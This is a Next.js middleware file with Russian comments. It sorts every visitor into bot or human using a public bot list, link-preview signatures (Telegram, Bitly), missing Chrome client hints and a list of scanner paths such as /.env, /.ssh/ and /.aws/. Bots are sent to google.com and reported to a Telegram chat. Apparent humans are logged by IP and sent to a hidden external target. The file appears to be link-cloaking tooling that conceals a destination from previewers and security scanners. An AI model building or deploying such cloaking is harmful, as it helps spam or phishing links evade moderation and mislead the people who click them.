import { NextResponse } from "next/server";

//
const BOT_JSON_URL = "https://raw.githubusercontent.com/arcjet/well-known-bots/main/well-known-bots.json";
const URL_SITE = process.env.URL_SITE || "https://yahoo.com"; 
const BOT_LIST_TTL = 60 * 60 * 1000; // кешировать 1 час
const TELEGRAM_TIMEOUT_MS = 2700; // таймаут для вызова телеграма в middleware
const PRIMARY_HOST = (process.env.URL && new URL(process.env.URL).hostname.toLowerCase()) || "girlgram.ru";
// Вставь сюда токен/чат или используй env-переменные
const BOT_TOKEN = process.env.TG_BOT_TOKEN || ""; // например '6438....'
const CHAT_ID = process.env.TG_CHAT_ID || "";     // например '1743635369'

const STATIC_BOT_REGEXES = [
  /\btelegrambot\b/i,
  /\bbitlybot\b/i,
  /\bbitlypreview\b/i,
  /\blinkpreview\b/i,
  /\burlpreview\b/i,
];

const HUMAN_HEADER_HINTS = [
  "accept-language",
  "sec-ch-ua",
  "sec-fetch-site",
  "sec-fetch-mode",
  "upgrade-insecure-requests",
];

// Подозрительные пути, которые указывают на сканеры уязвимостей
const SUSPICIOUS_PATHS = [
  /\/env\.php$/i,
  /\/\.env$/i,
  /\/wp-admin\//i,
  /\/wp-login\.php$/i,
  /\/wp-config\.php$/i,
  /\/setup-config\.php$/i,
  /\/xmlrpc\.php$/i,
  /\/phpmyadmin/i,
  /\/admin\.php$/i,
  /\/config\.php$/i,
  /\/database\.php$/i,
  /\/db\.php$/i,
  /\/\.git\//i,
  /\/\.aws\//i,
  /\/\.ssh\//i,
  /\/\.htaccess$/i,
  /\/shell\.php$/i,
  /\/phpinfo\.php$/i,
  /\/adminer\.php$/i,
  /\/sql/i,
  /\/mysql/i,
];

// кэш в глобальной области (edge runtime / serverless может переиспользовать)
if (!globalThis.__bot_cache) {
  globalThis.__bot_cache = { regexes: [...STATIC_BOT_REGEXES], fetchedAt: 0, fetching: null };
}

function getHeaderValue(req, name) {
  if (typeof req.headers?.get === "function") return req.headers.get(name);
  if (req.headers && typeof req.headers === "object") return req.headers[name];
  return undefined;
}

function getReferrerHostname(req) {
  const ref = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
  if (!ref) return null;
  try {
    return new URL(ref).hostname.toLowerCase();
  } catch (e) {
    console.warn("Bad referer URL:", ref);
    return null;
  }
}

function looksLikeBrowserRequest(req, ua) {
  if (!ua) return false;

  const hasMozillaToken = /Mozilla\/\d/i.test(ua);
  const acceptLanguage = (getHeaderValue(req, "accept-language") || "").trim();
  const secChUa = (getHeaderValue(req, "secChUa") || "").trim();

  if (!hasMozillaToken) return false;

  let hintCount = 0;
  for (const headerName of HUMAN_HEADER_HINTS) {
    const value = getHeaderValue(req, headerName);
    if (value) {
      hintCount += 1;
      if (hintCount >= 1) break;
    }
  }

  if (!acceptLanguage || acceptLanguage === "-" || !/[a-z]{2}(-[A-Z]{2})?/i.test(acceptLanguage.split(",")[0])) {
    return false;
  }

  if (hintCount >= 1) return true;

  const refererHeader = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
  if (refererHeader && req.method?.toUpperCase?.() === "GET") return true;

  if (/Windows NT|Macintosh|Android|iPhone|iPad|Linux/i.test(ua)) return true;

  return false;
}

// Проверка на поддельные заголовки современного браузера
function hasFakeChromeHeaders(req, ua) {
  // Если UA содержит Chrome/90+, но нет sec-ch-ua заголовков - подозрительно
  const chromeMatch = ua.match(/Chrome\/(\d+)/);
  if (chromeMatch && parseInt(chromeMatch[1]) >= 89) {
    const secChUa = getHeaderValue(req, "sec-ch-ua");
    const secChUaMobile = getHeaderValue(req, "sec-ch-ua-mobile");
    const secChUaPlatform = getHeaderValue(req, "sec-ch-ua-platform");
    
    // Если все эти заголовки либо отсутствуют, либо равны "-", это подозрительно
    const hasValidSecChHeaders = 
      secChUa && secChUa !== "-" && secChUa.trim() !== "" ||
      secChUaMobile && secChUaMobile !== "-" && secChUaMobile.trim() !== "" ||
      secChUaPlatform && secChUaPlatform !== "-" && secChUaPlatform.trim() !== "";
    
    return !hasValidSecChHeaders;
  }
  
  return false;
}

// Проверка на сканеры уязвимостей
function isSuspiciousScanner(req, url, refererHeader) {
  // 1. Проверка на подозрительные пути
  for (const pattern of SUSPICIOUS_PATHS) {
    if (pattern.test(url)) {
      return { suspicious: true, reason: `suspicious path: ${url}` };
    }
  }
  
  // 2. Проверка на совпадающие referer и url (признак сканирования)
  if (refererHeader) {
    try {
      const refUrl = new URL(refererHeader);
      const refPath = refUrl.pathname;
      
      // Если referer содержит тот же подозрительный путь, что и запрос
      for (const pattern of SUSPICIOUS_PATHS) {
        if (pattern.test(url) && pattern.test(refPath)) {
          return { suspicious: true, reason: `matching suspicious referer+url: ${refPath} → ${url}` };
        }
      }
    } catch (e) {
      // Игнорируем невалидные URL
    }
  }
  
  return { suspicious: false, reason: null };
}



async function loadBotRegexes() {
  const now = Date.now();
  const cache = globalThis.__bot_cache;

  // если в кэше и не устарело — вернуть
  if (cache.regexes.length && now - cache.fetchedAt < BOT_LIST_TTL) return cache.regexes;

  // если уже идёт fetch — дождаться его
  if (cache.fetching) {
    try { await cache.fetching } catch(e) {}
    return cache.regexes;
  }

  // запускаем fetch и сохраняем промис в cache.fetching
  cache.fetching = (async () => {
    try {
      const res = await fetch(BOT_JSON_URL, { cf: { cacheTtl: 3600 } });
      if (!res.ok) {
        console.warn("bot list fetch failed", res.status);
        cache.fetching = null;
        return cache.regexes;
      }
      const json = await res.json();

      const regexes = [];
      if (Array.isArray(json)) {
        for (const entry of json) {
          // entry может быть строкой или объектом { pattern: "..." }
          let pattern = null;
          if (typeof entry === "string") pattern = entry;
          else if (entry && typeof entry.pattern === "string") pattern = entry.pattern;
          else if (entry && typeof entry.ua === "string") pattern = entry.ua;

          if (!pattern) continue;

          // если pattern выглядит как /.../ то вырежем / и флаги (в случае)
          let rx = null;
          try {
            if (pattern.startsWith("/") && pattern.lastIndexOf("/") > 0) {
              const last = pattern.lastIndexOf("/");
              const body = pattern.slice(1, last);
              const flags = pattern.slice(last + 1);
              rx = new RegExp(body, flags.includes("i") ? flags : flags + "i");
            } else {
              // безопасно создаём RegExp (экранируем обычные строки? но часто в списках уже regex)
              // попытаемся сначала как регулярку, если упадёт — используем простую includes-проверку ниже
              try {
                rx = new RegExp(pattern, "i");
              } catch (e) {
                // если невалидная regex, превратим в экранированную строку
                rx = new RegExp(pattern.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"), "i");
              }
            }
          } catch (e) {
            continue;
          }
          if (rx) regexes.push(rx);
        }
      }
      const merged = new Map();
      for (const rx of [...STATIC_BOT_REGEXES, ...regexes]) {
        if (!rx) continue;
        const key = `${rx.source}__${rx.flags}`;
        if (!merged.has(key)) merged.set(key, rx);
      }
      cache.regexes = Array.from(merged.values());
      cache.fetchedAt = Date.now();
    } catch (e) {
      console.warn("Error loading bot patterns:", e?.message || e);
    } finally {
      cache.fetching = null;
    }
  })();

  await cache.fetching;
  return cache.regexes;
}

function getDomain(req) {
  try {
    const hostHeader = getHeaderValue(req, "x-forwarded-host") || getHeaderValue(req, "host");
    if (hostHeader) {
      return new URL("http://" + hostHeader).hostname; // берём только hostname
    }

    const referer = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer");
    if (referer) {
      try {
        return new URL(referer).hostname; // всегда hostname
      } catch (e) {
        console.warn("Bad referer URL:", referer);
      }
    }

    const envUrl = process.env.URL || process.env.DEPLOY_URL;
    if (envUrl) {
      try {
        return new URL(envUrl).hostname;
      } catch (e) {
        return envUrl;
      }
    }
  } catch (err) {
    console.warn("getDomain failed:", err);
  }
  return "unknown-domain";
}


async function notifyTelegram(text, req, data = {}) {
  let envUrl = "unknown-domain";

  const mainDomain = getDomain(req);
  console.log("Detected domain:", mainDomain);
  try {
    envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
    console.log("env URL:", envUrl);
  } catch (err) {
    console.warn("failed to read env vars:", err);
  }

  const token = BOT_TOKEN || process.env.TG_BOT_TOKEN;
  const chat = CHAT_ID || process.env.TG_CHAT_ID;
  if (!token || !chat) {
    console.warn("Telegram token/chat not set");
    return;
  }

  // пробуем вытащить домен
  const finalText = `🌐 main: ${mainDomain} / ${envUrl}\n${text}`;

  const controller = new AbortController();
  const id = setTimeout(() => controller.abort(), TELEGRAM_TIMEOUT_MS);

  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chat, text: finalText }),
      signal: controller.signal,
    });
  } catch (e) {
    console.warn("Telegram notify failed (ignored)", e?.message || e);
  } finally {
    clearTimeout(id);
  }
}



export async function middleware(req) {
  const ua = req.headers.get("user-agent") || "";
  const method = req.method?.toUpperCase?.() || "GET";
  const refererHeader = getHeaderValue(req, "referer") || getHeaderValue(req, "referrer") || "";
  const purposeHeader = (getHeaderValue(req, "purpose") || getHeaderValue(req, "sec-purpose") || "").toLowerCase();
  const secFetchDest = (getHeaderValue(req, "sec-fetch-dest") || "").toLowerCase();
  const isHumanLike = looksLikeBrowserRequest(req, ua);
  const url = req.nextUrl.pathname + (req.nextUrl.search || "");
  const ip = req.headers.get("x-forwarded-for") || req.headers.get("cf-connecting-ip") || "unknown";
  let envUrl = process.env.URL || process.env.DEPLOY_URL || "unknown-domain";
  // --- достаем домен из ENV ---
  const mainDomain = getDomain(req);
  try {
    // убираем https:// или http:// если есть
    envUrl = new URL(envUrl).host;
  } catch (e) {
    console.warn("Invalid envUrl:", envUrl);
  }

  // дополнительные хедеры посетителя для логов
  const acceptLanguage = getHeaderValue(req, "accept-language") || "-";
  const secChUa = getHeaderValue(req, "sec-ch-ua") || getHeaderValue(req, "sec-ch-ua-full") || "-";
  const secChUaMobile = getHeaderValue(req, "sec-ch-ua-mobile") || "-";
  const secChUaPlatform = getHeaderValue(req, "sec-ch-ua-platform") || "-";

  // загружаем паттерны (из кэша или сети)
  let regexes = [];
  try {
    regexes = await loadBotRegexes();
  } catch (e) {
    console.warn("loadBotRegexes failed", e?.message || e);
  }

  const isKnownBot = regexes.some(rx => {
    try { return rx.test(ua); } catch (e) { return false; }
  });

  const isPreview = /prefetch|preview|prerender/.test(purposeHeader) || secFetchDest === "empty";
  const suspiciousHead = method === "HEAD" && !refererHeader;
  
  // Новые проверки на сканеры
  const scannerCheck = isSuspiciousScanner(req, url, refererHeader);
  const hasFakeHeaders = hasFakeChromeHeaders(req, ua);
  
  // Определяем, является ли это ботом по любому из критериев
  let isBot = false;
  let botReason = "";
  
  if (isKnownBot) {
    isBot = true;
    botReason = "🚨 Known bot detected";
  } else if (isPreview) {
    isBot = true;
    botReason = "🚨 Срабатывание Heuristic блокировки (purpose: preview/prefetch)";
  } else if (suspiciousHead) {
    isBot = true;
    botReason = "🚨 Срабатывание Heuristic блокировки (HEAD без referer)";
  } else if (scannerCheck.suspicious) {
    isBot = true;
    botReason = `🚨 Vulnerability scanner detected: ${scannerCheck.reason}`;
  } else if (hasFakeHeaders) {
    isBot = true;
    botReason = "🚨 Fake Chrome headers (missing sec-ch-ua)";
  } else if (!isHumanLike) {
    isBot = true;
    botReason = "🚨 Подозрительный запрос (нет признаков браузера)";
  }

  if (isBot) {
    // Логируем бота перед редиректом
    try {
      console.log(JSON.stringify({
        mainDomain,
        referer: refererHeader || "—",
        url,
        method,
        ip,
        ua: ua || "—",
        acceptLanguage,
        secChUa,
        secChUaMobile,
        secChUaPlatform,
        isBot: true,
        botReason: botReason,
        timestamp: new Date().toISOString()
      }));
    } catch (e) {
      console.log(`BOT DETECTED | ${botReason} | mainDomain: ${mainDomain} | URL: ${url} | IP: ${ip}`);
    }
    
    notifyTelegram(
      `${botReason}\nUA: ${ua || "<пусто>"}\nIP: ${ip}\nURL: ${url}\nReferer: ${refererHeader || "—"}\nMethod: ${method}\nPurpose: ${purposeHeader || "—"}`,
      req
    );
    return NextResponse.redirect("https://google.com");
  }
  // --- улучшенный лог: теперь вместе с mainDomain и referer выводим данные посетителя ---
  try {
    console.log(JSON.stringify({
      mainDomain,
      referer: refererHeader || "—",
      url,
      method,
      ip,
      ua: ua || "—",
      acceptLanguage,
      secChUa,
      secChUaMobile,
      secChUaPlatform,
      isBot: false,  // легитимный пользователь
      timestamp: new Date().toISOString()
    }));
  } catch (e) {
    // на случай если console.log не поддерживает сложные объекты в вашей среде
    console.log(`mainDomain: ${mainDomain} | Referer: ${refererHeader || "—"} | UA: ${ua || "—"} | IP: ${ip} | isBot: false`);
  }

  // --- добавляем параметр src=envUrl в ссылку ---
  const target = new URL(URL_SITE);
  target.searchParams.set("s3", mainDomain);

  // редиректим на обновленную ссылку
  return NextResponse.redirect(target.toString());
}

// применяем на все роуты
export const config = { matcher: ["/:path*"] };
